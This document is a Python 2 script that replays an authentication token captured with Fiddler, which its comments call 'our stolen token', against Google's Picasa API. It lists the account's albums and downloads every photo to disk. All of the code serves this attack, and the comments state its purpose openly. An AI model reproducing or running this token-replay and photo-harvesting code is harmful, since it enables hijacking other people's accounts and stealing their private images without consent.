import requests
from lxml import etree

# Constants
FEED_URL = 'http://picasaweb.google.com/data/feed/base/user/default?kind=photo'
DOWNLOAD_URL = 'http://picasaweb.google.com/data/feed/api/user/{0}/albumid/{1}?max-results=1000&start-index=1&kind=photo&thumbsize=160c&imgmax=800&fields=entry(media:group(media:content))'

def main():
    # Get the sniffed authentication token from Fiddler
    token = raw_input('Please copy paste your auth token then press enter\n')
    headers = {'Authorization': token}

    # Get the user data from Google using our stolen token
    r = requests.get(FEED_URL, headers=headers)

    # Parse the response into an ElementTree
    doc = etree.fromstring(r.content)

    # Get the user's Picasa ID using an XPath expression
    author_uri = xpath_ns(doc, '//author/uri')[0].text
    author_id = author_uri.split('/')[-1]
    print 'User id: %s' % author_id

    # Get the user's album IDs using an XPath expression
    album_xpath = xpath_ns(doc, '//entry/gphoto:albumid')

    # Since our XPath expression returns multiple IDs, make sure we
    # get each one and save it
    # Use a set to make sure there are no duplicate IDs
    album_ids = set() 
    for album in album_xpath:
        if album.text not in album_ids:
            album_ids.add(album.text)
            print 'Album found: %s' % album.text

    for album in album_ids:

        # Ask Google for information on this album
        url = DOWNLOAD_URL.format(author_id, album)
        r = requests.get(url, headers=headers)

        # Parse the returned information into an ElementTree
        doc = etree.fromstring(r.content)

        # Use an XPath expression to get the URLs for each image
        image_xpath = xpath_ns(doc, '//entry/media:group/media:content')

        for image in image_xpath:

            # Get the URL from the returned Element object
            image_url = image.xpath('@url')[0]
            print 'Downloading %s' % image_url

            # Download and write the image to disk
            f = open(image_url.split('/')[-1], 'wb')
            f.write(requests.get(image_url).content)
            f.close()

# Helper function to simplify XPath expressions
# Source:
# http://stackoverflow.com/questions/5572247/how-to-find-xml-elements-via-xpath-in-python-in-a-namespace-agnostic-way
def xpath_ns(tree, expr):
    qual = lambda n: n if not n or ':' in n else '*[local-name() = "%s"]' % n
    expr = '/'.join(qual(n) for n in expr.split('/'))
    nsmap = dict((k, v) for k, v in tree.nsmap.items() if k)
    return tree.xpath(expr, namespaces=nsmap)

if __name__ == '__main__':
    main()
